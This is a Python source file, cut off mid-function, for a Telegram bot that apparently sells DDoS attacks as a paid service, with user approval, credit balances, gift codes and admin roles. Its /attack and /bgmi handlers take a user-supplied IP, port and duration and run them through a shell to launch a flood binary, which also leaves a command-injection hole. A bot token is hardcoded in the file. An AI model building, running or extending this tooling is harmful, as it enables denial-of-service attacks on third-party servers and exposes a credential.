import telebot
import subprocess
import requests
import datetime
import os
import logging
import random
import string
from telebot import TeleBot

# Configure logging
logging.basicConfig(filename='bot.log', level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Insert your Telegram bot token here
bot = telebot.TeleBot('7249644400:AAEZQiRq5FtL3E6DnRzKlFgdagqFvTxwKnI')
# Owner and admin user IDs
owner_id = "6077036964"
admin_ids = ["6077036964"]
admin_id = ["6077036964"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# File to store free user IDs and their credits
FREE_USER_FILE = "free_users.txt"

# Dictionary to store free user credits
free_user_credits = {}

# Dictionary to store cooldown time for each user's last attack
attack_cooldown = {}

# Dictionary to store gift codes with duration
gift_codes = {}

# Key prices for different durations
key_prices = {
    "day": 200,
    "week": 800,
    "month": 1200
}

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return [line.split()[0] for line in file.readlines()]
    except FileNotFoundError:
        return []

# Function to read free user IDs and their credits from the file
def read_free_users():
    try:
        with open(FREE_USER_FILE, "r") as file:
            lines = file.read().splitlines()
            for line in lines:
                if line.strip():  # Check if line is not empty
                    user_info = line.split()
                    if len(user_info) == 2:
                        user_id, credits = user_info
                        free_user_credits[user_id] = int(credits)
                    else:
                        print(f"Ignoring invalid line in free user file: {line}")
    except FileNotFoundError:
        pass

# Read allowed user IDs and free user IDs
allowed_user_ids = read_users()
read_free_users()

# Function to log command to the file
def log_command(user_id, target, port, duration):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {duration}\n\n")

# Function to clear logs
def clear_logs():
    try:
        with open(LOG_FILE, "r+") as file:
            if file.read() == "":
                response = "Logs are already cleared. No data found ❌."
            else:
                file.truncate(0)
                response = "Logs cleared successfully ✅"
    except FileNotFoundError:
        response = "No logs found to clear."
    return response

# Function to record command logs
def record_command_logs(user_id, command, target=None, port=None, duration=None):
    log_entry = f"UserID: {user_id} | Time: {datetime.datetime.now()} | Command: {command}"
    if target:
        log_entry += f" | Target: {target}"
    if port:
        log_entry += f" | Port: {port}"
    if duration:
        log_entry += f" | Time: {duration}"
    
    with open(LOG_FILE, "a") as file:
        file.write(log_entry + "\n")

# Function to get current time
def get_current_time():
    return datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")

@bot.message_handler(commands=['time'])
def send_current_time(message):
    now = datetime.datetime.now()
    current_time = f"CURRENT TIME IS\n\n{now.year}/{now.month}/{now.day}/{now.minute}/{now.second % 60}"
    bot.send_message(message.chat.id, current_time)

import telebot
from telebot import types

@bot.message_handler(commands=['start'])
def send_welcome(message):
    response = (
        "𝙒𝙀𝙇𝘾𝙊𝙈𝙀 𝙏𝙊 𝙏𝙃𝙀 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈 𝘿𝘿𝙊𝙎 𝘽𝙊𝙏\n\n"
        "𝙁𝙊𝙍 𝙐𝙎𝙀𝙍𝙎 𝘾𝙊𝙈𝙈𝘼𝙉𝘿𝙎 👇\n\n"
        "/𝙖𝙩𝙩𝙖𝙘𝙠 = 𝘽𝘼𝙎𝙄𝘾 𝙋𝙇𝘼𝙉 - 120𝙨\n"
        "/𝙗𝙜𝙢𝙞 = 𝙋𝘼𝙄𝘿 𝙋𝙇𝘼𝙉 - 300𝙨\n\n"
        "/𝙢𝙪𝙩𝙚 = 𝙈𝙐𝙏𝙀 𝘼 𝙐𝙎𝙀𝙍\n"
        "/𝙢𝙮𝙞𝙣𝙛𝙤 = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝙄𝙉𝙁𝙊\n"
        "/𝙤𝙬𝙣𝙚𝙧 = 𝙏𝙊 𝙂𝙀𝙏 𝙊𝙒𝙉𝙀𝙍 𝙄𝘿\n"
        "/𝙧𝙚𝙙𝙚𝙚𝙢 = 𝙏𝙊 𝙍𝙀𝘿𝙀𝙀𝙈 𝘼 𝘾𝙊𝘿𝙀\n\n"
        "/𝙖𝙙𝙢𝙞𝙣_𝙘𝙤𝙢𝙢𝙖𝙣𝙙 = 𝙁𝙊𝙍 𝙊𝙉𝙇𝙔 ( 𝙊𝙒𝙉𝙀𝙍 / 𝘼𝘿𝙈𝙄𝙉𝙎\n"
        "/𝙘𝙝𝙚𝙘𝙠𝙗𝙖𝙡𝙖𝙣𝙘𝙚 = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝙔𝙊𝙐𝙍 𝘽𝘼𝙇𝘼𝙉𝘾𝙀\n"
        "2 PLAN AVAILABLE DM TO BUY 😁\n\n"
        "/𝙩𝙞𝙢𝙚 = 𝙏𝙊 𝘾𝙃𝙀𝘾𝙆 𝘾𝙐𝙍𝙍𝙀𝙉𝙏 𝙏𝙄𝙈𝙀\n\n"
        "𝗧𝗵𝗶𝘀 𝗯𝗼𝘁 𝗶𝘀 𝘂𝗻𝗱𝗲𝗿 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗺𝗲𝗻𝘁 𝘀𝗼 𝗶𝗳 𝘆𝗼𝘂 𝗵𝗮𝘃𝗲 𝗮𝗻𝘆 𝗶𝘀𝘀𝘂𝗲𝘀 𝗽𝗹𝗲𝗮𝘀𝗲 𝗗𝗠 𝗺𝗲."
    )

    # Creating inline keyboard buttons
    markup = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text="👤 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐎𝐖𝐍𝐄𝐑 👤", url="https://t.me/MR_ARMAN_OWNER")
    group_button = types.InlineKeyboardButton(text="💖 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐆𝐑𝐔𝐏 💖", url="https://t.me/ARMANTEAMVIP")
    
    markup.add(contact_button, group_button)
    
    bot.send_message(message.chat.id, response, reply_markup=markup)

@bot.message_handler(commands=['owner'])
def send_owner_message(message):
    owner_message = "👤 OWNER ID - @MR_ARMAN_OWNER 🎉"
    bot.reply_to(message, owner_message)

@bot.message_handler(commands=['myinfo'])
def my_info(message):
    user = message.from_user
    is_approved = "✔️ Approved" if user.id in allowed_user_ids else "❌ N/A"

    user_info = (
        f"✨ ᕼᕮY @{user.first_name}\nHƐRƐ'S ƳOUR ƊƐƬAILS ⚓\n"
        f"👤 тԍ usᴇʀ ιᴅ : {user.id}\n"
        f"👍 тԍ usᴇʀɴᴀмᴇ : @{user.username if user.username else 'ɴoт sᴇт'}\n"
        f"🌍 ғιʀsт ɴᴀмᴇ : {user.first_name}\n"
        f"🆔 ʟᴀsт ɴᴀмᴇ : {user.last_name if user.last_name else 'ɴoт sᴇт'}\n"
        f"📅 נoιɴᴇᴅ ᴅᴀтᴇ : {message.date}\n"
        f"💌 cнᴀт ιᴅ : {message.chat.id}\n"
        f"✔️ ᴀᴘᴘʀovᴀʟ sтᴀтus : {is_approved}\n\n"
        f"κᴇᴇᴘ sнιɴιɴԍ ᴀɴᴅ нᴀvᴇ ᴀ woɴᴅᴇʀғuʟ ᴅᴀʏ! 🌈✨\n"
        f"ŦĦƗS ɃØŦ ØWNɆɌ :- @MR_ARMAN_OWNER"
    )
    
    bot.send_message(message.chat.id, user_info, parse_mode='Markdown')

@bot.message_handler(commands=['approve_details'])
def approve_details(message):
    user_id = message.from_user.id
    if user_id in allowed_user_ids:
        bot.send_message(message.chat.id, "CHECKING PLEASE WAIT...")
        time.sleep(1)  # Wait for 1 second
        bot.send_message(message.chat.id, f"USER DETAILS FOR ID {user_id}!")
    else:
        bot.send_message(message.chat.id, "You are not authorized to use this command.")

@bot.message_handler(commands=['admin_command'])
def send_admin_command(message):
    response = (
        "𝗔𝗗𝗠𝗜𝗡 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦 (𝗢𝗪𝗡𝗘𝗥/𝗔𝗗𝗠𝗜𝗡𝗦 𝗢𝗡𝗟𝗬) 👇\n\n"
        "/𝗮𝗱𝗱_𝗮𝗱𝗺𝗶𝗻 = 𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡 𝗢𝗡 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧 (𝗢𝗪𝗡𝗘𝗥 𝗢𝗡𝗟𝗬)\n"
        "/𝗿𝗲𝗺𝗼𝘃𝗲_𝗮𝗱𝗺𝗶𝗻 = 𝗥𝗘𝗠𝗢𝗩𝗘 𝗔 𝗔𝗗𝗠𝗜𝗡 (𝗢𝗪𝗡𝗘𝗥 𝗢𝗡𝗟𝗬)\n"
        "/𝗿𝗲𝗺𝗼𝘃𝗲_𝟮 = 𝗥𝗘𝗠𝗢𝗩𝗘 𝗔 𝗨𝗦𝗘𝗥 (𝗢𝗪𝗡𝗘𝗥 𝗢𝗡𝗟𝗬)\n"
        "/𝗰𝗿𝗲𝗮𝘁𝗲_𝗴𝗶𝗳𝘁_𝗰𝗼𝗱𝗲 = 𝗚𝗘𝗡𝗘𝗥𝗔𝗧𝗘 𝗔 𝗚𝗜𝗙𝗧 𝗖𝗢𝗗𝗘 (𝗢𝗪𝗡𝗘𝗥/𝗔𝗗𝗠𝗜𝗡𝗦 𝗢𝗡𝗟𝗬)\n"
        "/𝗽𝗹𝗮𝗻_𝟭 = 𝗧𝗢 𝗔𝗗𝗗 𝗨𝗦𝗘𝗥 (𝗢𝗪𝗡𝗘𝗥/𝗔𝗗𝗠𝗜𝗡𝗦 𝗢𝗡𝗟𝗬)\n"
        "/𝗽𝗹𝗮𝗻_𝟮 = 𝗧𝗢 𝗔𝗗𝗗 𝗨𝗦𝗘𝗥 𝗪𝗜𝗧𝗛 𝗣𝗔𝗜𝗗 𝗣𝗟𝗔𝗡 (𝗢𝗪𝗡𝗘𝗥 𝗢𝗡𝗟𝗬)\n"
        "/𝗹𝗼𝗴𝘀 = 𝗖𝗛𝗘𝗖𝗞 𝗟𝗢𝗚𝗦 (𝗢𝗪𝗡𝗘𝗥 𝗢𝗡𝗟𝗬)\n"
        "/𝗮𝗹𝗹𝘂𝘀𝗲𝗿𝘀 = 𝗖𝗛𝗘𝗖𝗞 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦 (𝗢𝗪𝗡𝗘𝗥 𝗢𝗡𝗟𝗬)\n"
        "/𝘀𝗲𝘁𝗸𝗲𝘆𝗽𝗿𝗶𝗰𝗲 = 𝗦𝗘𝗧 𝗞𝗘𝗬 𝗣𝗥𝗜𝗖𝗘 (𝗢𝗪𝗡𝗘𝗥 𝗢𝗡𝗟𝗬)\n\n"
        "𝗡𝗘𝗘𝗗 𝗠𝗢𝗥𝗘 𝗗𝗘𝗧𝗔𝗜𝗟𝗘𝗗 𝗖𝗢𝗠𝗠𝗔𝗡𝗗𝗦? 𝗖𝗟𝗜𝗖𝗞 👇\n"
        "/command_details"
    )

    # Creating inline keyboard buttons
    markup = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text="👤 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐎𝐖𝐍𝐄𝐑 👤", url="https://t.me/MR_ARMAN_OWNER")
    group_button = types.InlineKeyboardButton(text="💖 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐆𝐑𝐔𝐏 💖", url="https://t.me/ARMANTEAMVIP")

    markup.add(contact_button, group_button)

    bot.send_message(message.chat.id, response, reply_markup=markup)


@bot.message_handler(commands=['command_details'])
def send_command_details(message):
    response = (
        "𝗖𝗢𝗠𝗠𝗔𝗡𝗗 𝗗𝗘𝗧𝗔𝗜𝗟𝗦 👇\n\n"
        "/𝗽𝗹𝗮𝗻_𝟭 = 𝗧𝗢 𝗔𝗣𝗣𝗥𝗢𝗩𝗘 𝗨𝗦𝗘𝗥 𝗪𝗜𝗧𝗛 𝗙𝗥𝗘𝗘 𝗧𝗜𝗘𝗥\n"
        "/𝗽𝗹𝗮𝗻_𝟮 = 𝗧𝗢 𝗔𝗣𝗣𝗥𝗢𝗩𝗘 𝗨𝗦𝗘𝗥 𝗪𝗜𝗧𝗛 𝗣𝗔𝗜𝗗 𝗧𝗜𝗘𝗥\n"
        "/𝗹𝗼𝗴𝘀 = 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗟𝗢𝗚𝗦\n"
        "/𝗮𝗹𝗹𝘂𝘀𝗲𝗿𝘀 = 𝗧𝗢 𝗖𝗛𝗘𝗖𝗞 𝗔𝗟𝗟 𝗔𝗨𝗧𝗛𝗢𝗥𝗜𝗭𝗘𝗗 𝗨𝗦𝗘𝗥𝗦\n"
        "/𝘀𝗲𝘁𝗸𝗲𝘆𝗽𝗿𝗶𝗰𝗲 = ( ❌❌❌❌❌ )\n"
        "/𝗰𝗿𝗲𝗮𝘁𝗲_𝗴𝗶𝗳𝘁_𝗰𝗼𝗱𝗲 = 𝗧𝗢 𝗖𝗥𝗘𝗔𝗧𝗘 𝗔 𝗚𝗜𝗙𝗧 𝗖𝗢𝗗𝗘\n"
        "/𝗿𝗲𝗺𝗼𝘃𝗲_𝗮𝗱𝗺𝗶𝗻 = 𝗧𝗢 𝗥𝗘𝗠𝗢𝗩𝗘 𝗔𝗗𝗠𝗜𝗡 𝗙𝗥𝗢𝗠 𝗕𝗢𝗧\n"
        "/𝗮𝗱𝗱_𝗮𝗱𝗺𝗶𝗻 = 𝗧𝗢 𝗔𝗗𝗗 𝗔𝗗𝗠𝗜𝗡 𝗢𝗡 𝗧𝗛𝗜𝗦 𝗕𝗢𝗧"
    )

    # Creating inline keyboard buttons
    markup = types.InlineKeyboardMarkup()
    contact_button = types.InlineKeyboardButton(text="👤 𝐂𝐎𝐍𝐓𝐀𝐂𝐓 𝐎𝐖𝐍𝐄𝐑 👤", url="https://t.me/MR_ARMAN_OWNER")
    group_button = types.InlineKeyboardButton(text="💖 𝐎𝐅𝐅𝐈𝐂𝐈𝐀𝐋 𝐆𝐑𝐔𝐏 💖", url="https://t.me/ARMANTEAMVIP")

    markup.add(contact_button, group_button)

    bot.send_message(message.chat.id, response, reply_markup=markup)


@bot.message_handler(commands=['approve_1'])
def approve_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if duration not in key_prices:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            allowed_user_ids.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")
            
            response = f"User {user_to_approve} approved for {duration} 👍."
        else:
            response = "Usage: /approveuser <id> <duration>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['remove_1'])
def remove_user(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_ids:
                allowed_user_ids.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_ids:
                        file.write(f"{user}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeuser <id>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)
    
import datetime
from telebot import TeleBot

USER_FILE = 'users.txt'  # File to store user data

# Lists to store allowed users for each plan
allowed_user_id = []

@bot.message_handler(commands=['plan_2'])
def approve_user_2(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            user_to_approve = command[1]
            duration = command[2]
            if duration not in key_prices:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
                bot.send_message(message.chat.id, response)
                return

            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            allowed_user_id.append(user_to_approve)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_to_approve} {expiration_date}\n")
            
            response = f"User {user_to_approve} approved for {duration} 👍."
        else:
            response = "Usage: /plan_2 <id> <duration>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['remove_2'])
def remove_user_2(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            user_to_remove = command[1]
            if user_to_remove in allowed_user_id:
                allowed_user_id.remove(user_to_remove)
                with open(USER_FILE, "w") as file:
                    for user in allowed_user_id:
                        file.write(f"{user}\n")
                response = f"User {user_to_remove} removed successfully 👍."
            else:
                response = f"User {user_to_remove} not found in the list ❌."
        else:
            response = "Usage: /remove_2 <id>"
    else:
        response = "Only Admin or Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['add_admin'])
def add_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            admin_to_add = command[1]
            balance = int(command[2])
            admin_ids.append(admin_to_add)
            free_user_credits[admin_to_add] = balance
            response = f"Admin {admin_to_add} added with balance {balance} 👍."
        else:
            response = "Usage: /addadmin <id> <balance>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['remove_admin'])
def remove_admin(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 2:
            admin_to_remove = command[1]
            if admin_to_remove in admin_ids:
                admin_ids.remove(admin_to_remove)
                response = f"Admin {admin_to_remove} removed successfully 👍."
            else:
                response = f"Admin {admin_to_remove} not found in the list ❌."
        else:
            response = "Usage: /removeadmin <id>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['create_gift_code'])
def create_gift(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids:
        command = message.text.split()
        if len(command) == 2:
            duration = command[1]
            if duration in key_prices:
                amount = key_prices[duration]
                if user_id in free_user_credits and free_user_credits[user_id] >= amount:
                    code = ''.join(random.choices(string.ascii_uppercase + string.digits, k=10))
                    gift_codes[code] = duration
                    free_user_credits[user_id] -= amount
                    response = f"Gift code created: {code} for {duration} 🎁."
                else:
                    response = "You do not have enough credits to create a gift code."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /creategift <day/week/month>"
    else:
        response = "Only Admins Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['redeem'])
def redeem_gift(message):
    user_id = str(message.chat.id)
    command = message.text.split()
    if len(command) == 2:
        code = command[1]
        if code in gift_codes:
            duration = gift_codes.pop(code)
            expiration_date = datetime.datetime.now() + datetime.timedelta(days=1 if duration == "day" else 7 if duration == "week" else 30)
            if user_id not in allowed_user_ids:
                allowed_user_ids.append(user_id)
            with open(USER_FILE, "a") as file:
                file.write(f"{user_id} {expiration_date}\n")
            response = f"Gift code redeemed: You have been granted access for {duration} 🎁."
        else:
            response = "Invalid or expired gift code ❌."
    else:
        response = "Usage: /redeem <code>"
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['checkbalance'])
def check_balance(message):
    user_id = str(message.chat.id)
    if user_id in free_user_credits:
        response = f"Your current balance is {free_user_credits[user_id]} credits."
    else:
        response = "You do not have a balance account ❌."
    bot.send_message(message.chat.id, response)

@bot.message_handler(commands=['setkeyprice'])
def set_key_price(message):
    user_id = str(message.chat.id)
    if user_id == owner_id:
        command = message.text.split()
        if len(command) == 3:
            duration = command[1]
            price = int(command[2])
            if duration in key_prices:
                key_prices[duration] = price
                response = f"Key price for {duration} set to {price} credits 💸."
            else:
                response = "Invalid duration. Use 'day', 'week', or 'month'."
        else:
            response = "Usage: /setkeyprice <day/week/month> <price>"
    else:
        response = "Only the Owner Can Run This Command 😡."
    bot.send_message(message.chat.id, response)

# Function to handle the reply when free users run the /attack command
def start_attack_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
            
    response = f"👩‍💻 𝙎𝙏𝘼𝙍𝙏𝙀𝘿 👩‍💻\n\n💣 𝐓𝐚𝐫𝐠𝐞𝐭: {target} ⚔️\n💣 𝐏𝐎𝐑𝐓 {port} 👩‍💻\n📟 𝐃𝐔𝐑𝐀𝐓𝐈𝐎𝐍 {time} ⏳\n💣 𝐌𝐄𝐓𝐇𝐎𝐃: 𝘾𝙃𝙄𝙉 𝙏𝘼𝙋𝘼𝙆 𝘿𝘼𝙈 𝘿𝘼𝙈 🖤\n\n🔥 𝐒𝐓𝐀𝐓𝐔𝐒: 𝘼𝙏𝙏𝘼𝘾𝙆 𝙄𝙉 𝙋𝙍𝙊𝙂𝙍𝙀𝙎𝙎 𝙋𝙇𝙀𝘼𝙎𝙀 𝙒𝘼𝙄𝙏 {time} 🔥\n\n𝐉𝐎𝐈𝐍 𝐍𝐎𝐖 :- @ARMANTEAMVIP\n𝙊𝙒𝙉𝙀𝙍 :- @MR_ARMAN_OWNER"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

# Handler for /attack command and direct attack input
@bot.message_handler(func=lambda message: message.text and (message.text.startswith('/attack') or not message.text.startswith('/')))
def handle_attack(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        # Check if the user is not an admin or owner
        if user_id not in admin_ids and user_id != owner_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < 0:
                response = "You Are On Cooldown ❌. Please Wait 0sec Before Running The /attack Command Again."
                bot.reply_to(message, response)
                return
            # Update the last time the user ran the command
            bgmi_cooldown[user_id] = datetime.datetime.now()
        
        command = message.text.split()
        # Check if the message starts with '/attack' or not
        if len(command) == 4 or (not message.text.startswith('/') and len(command) == 3):
            # If it doesn't start with '/', assume it's an attack command and adjust the command list
            if not message.text.startswith('/'):
                command = ['/attack'] + command  # Prepend '/attack' to the command list
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            if time > 120:
                response = "❌ 𝗖𝗮𝗻'𝘁 𝗱𝗼 𝗶𝘁 𝗳𝗼𝗿 𝗺𝗼𝗿𝗲 𝘁𝗵𝗮𝗻 𝟭𝟮𝟬 𝘀𝗲𝗰𝗼𝗻𝗱𝘀 ❌\n𝗦𝗢𝗥𝗥𝗬 𝗬𝗢𝗨'𝗥𝗘 𝗢𝗡 𝗕𝗔𝗦𝗜𝗖 𝗣𝗟𝗔𝗡\n\n𝗨𝗣𝗚𝗥𝗔𝗗𝗘 𝗡𝗢𝗪 𝗬𝗢𝗨'𝗥𝗘 𝗣𝗟𝗔𝗡\n\n𝗧𝗢 𝗚𝗔𝗜𝗡 𝗔𝗖𝗖𝗘𝗦𝗦 𝗙𝗢𝗥 𝟯𝟬𝟬𝘀 ✅"
            else:
                record_command_logs(user_id, target, port, time)
                log_command(user_id, target, port, time)
                start_attack_reply(message, target, port, time)
                full_command = f"./JUPITER {target} {port} {time}"
                subprocess.run(full_command, shell=True)
                response = f"💠 𝘼𝙏𝙏𝘼𝘾𝙆 𝙁𝙄𝙉𝙄𝙎𝙃𝙀𝘿 💠\n\n👩‍💻𝙏𝘼𝙍𝙂𝙀𝙏  :- {target}💣 𝙋𝙊𝙍𝙏:- {port}\n📟 𝙏𝙄𝙈𝙀 :- {time}\n⚔️ 𝙈𝙀𝙏𝙃𝙊𝘿 :- 𝘼𝙍𝙈𝘼𝙉 𝙏𝙀𝘼𝙈 𝘼𝙏𝙏𝘼𝘾𝙆𝙀𝙍 𝙉𝘼𝙈𝙀 :- {username}\n\n𝐉𝐎𝐈𝐍 𝐍𝐎𝐖 :- @ARMANTEAMVIP\n𝙊𝙒𝙉𝙀𝙍 :- @MR_ARMAN_OWNER"
        else:
            response ="𝗣𝗟𝗔𝗡 𝟭 𝗔𝗧𝗧𝗔𝗖𝗞 𝗗𝗘𝗧𝗔𝗜𝗟𝗦\n\n𝗨𝗦𝗔𝗚𝗘 :- /𝗮𝘁𝘁𝗮𝗰𝗸 < 𝗜𝗣 > < 𝗣𝗢𝗥𝗧 > < 𝗧𝗜𝗠𝗘 >\n𝗘𝗫𝗔𝗠𝗣𝗟𝗘 :- /𝗮𝘁𝘁𝗮𝗰𝗸  𝟮𝟬.𝟬.𝟬 𝟴𝟳𝟬𝟬 𝟭𝟮𝟬\n\n𝙊𝙒𝙉𝙀𝙍 :- @MR_ARMAN_OWNER" 
    else:
        response = ("🚫 Unauthorized Access! 🚫\n\nOops! It seems like you don't have permission to use the /attack command. "
                    "To gain access and unleash the power of attacks, you can:\n\n👉 Contact an Admin or the Owner for approval.\n"
                    "🌟THE ONLY OWNER IS @MR_ARMAN_OWNER DM TO BUY ACCESS")

    bot.reply_to(message, response)

# message_handler(func=lambda message: True)
def handle_unknown_command(message):
    response = (
        f"🌟 Welcome to the FAITH DDOS Bot! 🌟\n\n"
        f"Current Time: {get_current_time()}\n\n"
        "Here are some commands you can use:\n"
        "❌ /removeuser <id> - Remove a user\n"
        "🔑 /addadmin <id> <balance> - Add an admin with a starting balance\n"
        "🚫 /removeadmin <id> - Remove an admin\n"
        "💰 /checkbalance - Check your balance\n"
        "💥 /attack <host> <port> <time> - Simulate a DDoS attack\n"
        "💸 /setkeyprice <day/week/month> <price> - Set key price for different durations (Owner only)\n"
        "🎁 /creategift <duration> - Create a gift code for a specified duration (Admin only)\n"
        "🎁 /redeem <code> - Redeem a gift code\n"
        "🚨 /allusers  : Authorised Users Lists\n"
        "🛑 /clearusers  :- Clear The USERS File\n"
        " ⚠️ /rules  :- Please Check Before Use !!\n\n"
        "Please use these commands responsibly. 😊"
    )

@bot.message_handler(commands=['rules'])
def welcome_rules(message):
    user_name = message.from_user.first_name
    response = f'''{user_name} 𝐏𝐥𝐞𝐚𝐬𝐞 𝐅𝐨𝐥𝐥𝐨𝐰 𝐓𝐡𝐞𝐬𝐞 𝐑𝐮𝐥𝐞𝐬 ⚠️:

𝟏. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝐓𝐨𝐨 𝐌𝐚𝐧𝐲 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 !! 𝐂𝐚𝐮𝐬𝐞 𝐀 𝐁𝐚𝐧 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭
𝟐. 𝐃𝐨𝐧𝐭 𝐑𝐮𝐧 𝟐 𝐀𝐭𝐭𝐚𝐜𝐤𝐬 𝐀𝐭 𝐒𝐚𝐦𝐞 𝐓𝐢𝐦𝐞 𝐁𝐞𝐜𝐳 𝐈𝐟 𝐔 𝐓𝐡𝐞𝐧 𝐔 𝐆𝐨𝐭 𝐁𝐚𝐧𝐧𝐞𝐝 𝐅𝐫𝐨𝐦 𝐁𝐨𝐭.
𝟒. 𝐖𝐞 𝐃𝐚𝐢𝐥𝐲 𝐂𝐡𝐞𝐜𝐤𝐬 𝐓𝐡𝐞 𝐋𝐨𝐠𝐬 𝐒𝐨 𝐅𝐨𝐥𝐥𝐨𝐰 𝐭𝐡𝐞𝐬𝐞 𝐫𝐮𝐥𝐞𝐬 𝐭𝐨 𝐚𝐯𝐨𝐢𝐝 𝐁𝐚𝐧!!'''
    bot.reply_to(message, response)

@bot.message_handler(commands=['allusers'])
def show_all_users(message):
    user_id = str(message.chat.id)
    if user_id in admin_ids or owner_id:
        try:
            with open(USER_FILE, "r") as file:
                user_ids = file.read().splitlines()
                if user_ids:
                    response = "Authorized Users:\n"
                    for user_id in user_ids:
                        try:
                            user_info = bot.get_chat(int(user_id))
                            username = user_info.username
                            response += f"- @{username} (ID: {user_id})\n"
                        except Exception as e:
                            response += f"- User ID: {user_id}\n"
                else:
                    response = "No data found ❌"
        except FileNotFoundError:
            response = "No data found ❌"
    else:
        response = "Only Owner and Admin Can Run This Command 😡."
    bot.reply_to(message, response)

# Function to handle the reply when free users run the /bgmi command
def start_bgmi_reply(message, target, port, time):
    user_info = message.from_user
    username = user_info.username if user_info.username else user_info.first_name
    
    response = f"🌠 STRATEGY DEPLOYED 🌠\n\n🚀 TARGET LOCKED [ ON YOUR SERVER ]... 💥\n⚔ BATTLE HAS COMMENCED ⚔\n\n🥷 ASSAULTING HOST ==) ( {target} )\n🥷 ENGAGED PORT ==) ( {port} )\n⏰ ATTACK DURATION -> ( {time} ) SECONDS 🔥\n\n💎 EXECUTED BY ARMAN TEAM ⚔\n\nnHOLD YOUR POSITION, NO ACTION NEEDED FOR {time} SECONDS\nTHANK YOU FOR UTILIZING AUR HAX 💫\n\nᴅᴇᴠᴇʟᴏᴘᴇʀ :--> @ᴍʀ_ᴀʀᴍᴀɴ_ᴏᴡɴᴇʀ"
    bot.reply_to(message, response)

# Dictionary to store the last time each user ran the /bgmi command
bgmi_cooldown = {}

COOLDOWN_TIME =5

# Handler for /bgmi command
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_id:
        # Check if the user is in admin_id (admins have no cooldown)
        if user_id not in admin_id:
            # Check if the user has run the command before and is still within the cooldown period
            if user_id in bgmi_cooldown and (datetime.datetime.now() - bgmi_cooldown[user_id]).seconds < COOLDOWN_TIME:
